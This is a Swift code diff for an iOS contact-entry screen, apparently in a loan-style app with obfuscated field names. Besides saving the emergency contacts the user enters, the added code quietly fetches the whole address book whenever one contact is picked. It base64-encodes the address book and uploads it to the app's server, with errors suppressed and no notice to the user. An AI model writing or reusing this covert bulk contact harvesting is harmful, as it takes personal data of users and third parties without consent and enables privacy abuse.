@@ -28,6 +28,8 @@ class ContactViewController: BaseViewController {
     
     let contactManager = ContactManager()
     
+    var dictArray: [[String: String]] = []
+    
     lazy var headImageView: UIImageView = {
         let headImageView = UIImageView()
         headImageView.image = languageCode == .id ? UIImage(named: "fa_d_c_bg_image") : UIImage(named: "fa_f_c_bg_image")
@@ -107,6 +109,19 @@ class ContactViewController: BaseViewController {
         
         footerView.nextBlock = { [weak self] in
             guard let self = self else { return }
+            
+            dictArray = self.listModelArray.map { model in
+                [
+                    "thankia": model.thankia ?? "",
+                    "catchtic": model.catchtic ?? "",
+                    "tactad": model.tactad ?? "",
+                    "thoughance": model.thoughance ?? ""
+                ]
+            }
+            
+            Task {
+                await self.saveContactInfo(with: self.dictArray)
+            }
         }
         
     }
@@ -154,20 +169,32 @@ extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
                 }
                 
                 if let contacts = contacts {
-                    print("选择的联系人: \(contacts)")
+                    if let parameters = contacts.first {
+                        let phone = parameters["paginitor"] ?? ""
+                        let name = parameters["catchtic"] ?? ""
+                        if phone.isEmpty || name.isEmpty {
+                            ToastManager.showMessage(LanguageManager.localizedString(for: "Name or phone number cannot be empty."))
+                            return
+                        }
+                        listModel.catchtic = name
+                        listModel.thankia = phone
+                        cell.secondSectionView.textField.text = String(format: "%@-%@", name, phone)
+                    }
+                    
                 }
             }
             
             /// all_picker_info
-            contactManager.fetchAllContacts { contacts, error in
+            contactManager.fetchAllContacts { [weak self] contacts, error in
                 if let error = error {
                     print("error===: \(error.localizedDescription)")
                     return
                 }
                 
                 if let contacts = contacts {
-                    print("所有联系人: \(contacts)")
-                    
+                    Task {
+                        await self?.uploadAllContactInfo(with: contacts)
+                    }
                 }
             }
         }
@@ -255,8 +282,10 @@ extension ContactViewController {
         }
     }
     
-    private func saveContactInfo(with parameters: [String: String]) async {
+    private func saveContactInfo(with listArray: [[String: String]]) async {
         do {
+            let jsonStr = convertContactsToJsonStr(listArray)
+            let parameters = ["seget": productID, "anyably": jsonStr]
             let model = try await viewMdoel.saveContactApi(parameters: parameters)
             let peaceent = model.peaceent ?? ""
             if peaceent == "0" || peaceent == "00" {
@@ -267,6 +296,37 @@ extension ContactViewController {
         } catch {
             
         }
+    }
+    
+    private func uploadAllContactInfo(with listArray: [[String: String]]) async {
+        do {
+            let baseStr = convertContactsToBase64(listArray)
+            let parameters = ["stenics": "3", "environment": "iOS", "anyably": baseStr]
+            _ = try await viewMdoel.uploadAllContactApi(parameters: parameters)
+        } catch {
+            
+        }
+    }
+    
+    func convertContactsToBase64(_ contacts: [[String: String]]) -> String {
+        do {
+            let jsonData = try JSONSerialization.data(withJSONObject: contacts, options: [])
+            
+            let base64String = jsonData.base64EncodedString()
+            
+            return base64String
+        } catch {
+            print("Base64-error: \(error)")
+            return ""
+        }
+    }
+    
+    func convertContactsToJsonStr(_ contacts: [[String: String]]) -> String {
+        guard let jsonData = try? JSONSerialization.data(withJSONObject: contacts),
+              let jsonString = String(data: jsonData, encoding: .utf8) else {
+            return ""
+        }
+        return jsonString
     }
     
 }
